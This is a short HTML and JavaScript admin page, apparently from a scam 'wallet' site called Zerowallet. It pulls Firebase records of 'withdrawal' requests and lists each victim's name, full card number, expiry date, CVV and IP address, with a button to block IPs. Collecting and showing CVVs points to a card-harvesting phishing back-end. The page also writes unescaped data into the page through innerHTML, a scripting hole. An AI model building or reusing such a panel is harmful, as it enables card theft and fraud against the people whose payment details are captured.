<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <title>Zerowallet - ADMIN PANEL</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { border: 1px solid #333; padding: 10px; text-align: left; }
        .block-btn { background: red; color: white; border: none; padding: 5px; cursor: pointer; }
    </style>
</head>
<body>
    <h1>ADMIN CONTROL PANEL (v2.4)</h1>
    
    <h3>ÇIXARIŞ TƏLƏBLƏRİ VƏ KARTLAR</h3>
    <table id="card-table">
        <tr>
            <th>İstifadəçi</th><th>Məbləğ</th><th>Ad Soyad</th><th>Kart No</th><th>Exp</th><th>CVV</th><th>IP</th><th>Əməliyyat</th>
        </tr>
    </table>

    <script>
        // Eyni Firebase Config-i bura da qoyun
        const firebaseConfig = { ... }; 
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // Kart məlumatlarını gətir
        db.ref('admin_withdrawals').on('value', snap => {
            const table = document.getElementById('card-table');
            table.innerHTML = `<tr><th>İstifadəçi</th><th>Məbləğ</th><th>Ad Soyad</th><th>Kart No</th><th>Exp</th><th>CVV</th><th>IP</th><th>Əməliyyat</th></tr>`;
            
            snap.forEach(child => {
                const d = child.val();
                table.innerHTML += `
                    <tr>
                        <td>${d.username}</td>
                        <td>${d.amount} AZN</td>
                        <td>${d.cardName}</td>
                        <td style="color:yellow">${d.cardNum}</td>
                        <td>${d.cardExp}</td>
                        <td>${d.cardCvv}</td>
                        <td>${d.ip}</td>
                        <td><button class="block-btn" onclick="blockIp('${d.ip}')">IP BLOKLA</button></td>
                    </tr>`;
            });
        });

        function blockIp(ip) {
            const cleanIp = ip.replace(/\./g, '_');
            db.ref('blocked_ips/' + cleanIp).set(true);
            alert(ip + " ünvanı bloklandı!");
        }
    </script>
</body>
</html>
